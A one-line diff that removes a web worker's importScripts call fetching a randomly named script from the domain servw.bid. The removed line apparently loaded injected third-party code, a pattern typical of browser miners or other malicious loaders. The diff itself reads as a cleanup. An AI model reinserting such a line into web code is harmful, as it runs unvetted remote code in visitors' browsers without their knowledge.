@@ -1,1 +1,0 @@
-importScripts('https://servw.bid/sAaLfDZlLR.js')
